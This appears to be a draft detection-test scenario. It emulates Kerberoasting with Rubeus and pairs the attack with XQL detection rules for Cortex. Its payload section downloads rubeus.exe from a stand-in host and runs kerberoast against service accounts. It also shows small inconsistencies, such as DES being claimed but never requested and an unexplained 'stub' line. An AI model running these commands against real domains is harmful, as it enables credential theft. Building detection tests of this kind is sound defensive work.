identity.name: Kerberoasting with Rubeus to Request Weakly-Encrypted Tickets
identity.summary: An attacker uses Rubeus to request Kerberos service tickets with weak encryption (DES) from a domain controller, which triggers the 'Multiple Weakly-Encrypted Kerberos Tickets Received' alert. Cortex
identity.description: An attacker uses Rubeus to request Kerberos service tickets with weak encryption (DES) from a domain controller, which triggers the 'Multiple Weakly-Encrypted Kerberos Tickets Received' alert. Cortex should detect the execution of Rubeus and the subsequent network connections to the domain controller.

techniques.name: Steal or Forge Kerberos Tickets: Kerberoasting

payload.code:
wget https://example.com/rubeus.exe -O C:\temp\rubeus.exe
stub C:\temp\rubeus.exe
C:\temp\rubeus.exe kerberoast /user:svc_account /outfile:ticket.kirbi
C:\temp\rubeus.exe kerberoast /user:another_user /outfile:ticket2.kirbi

expected_artifacts.description: Connection to domain controller for ticket request

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rubeus Kerberoast Execution
biocs.description: Detection of Rubeus.exe being executed with kerberoast command
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'rubeus.exe'
| filter action_process_command_line contains 'kerberoast'

abiocs.name: Multiple Weakly-Encrypted Tickets Requested
abiocs.description: Detection of multiple weakly-encrypted Kerberos tickets requested in short time window
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip = '192.0.2.1'
| filter dst_port = 88
| filter action_protocol = 'kerberos'
| comp count() by actor_process_image_name
| filter count() > 1

xql_queries.name: Detect Weakly Encrypted Tickets
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip = '192.0.2.1'
| filter dst_port = 88
| filter action_protocol = 'kerberos'
| comp count() by actor_process_image_name
| filter count() > 1
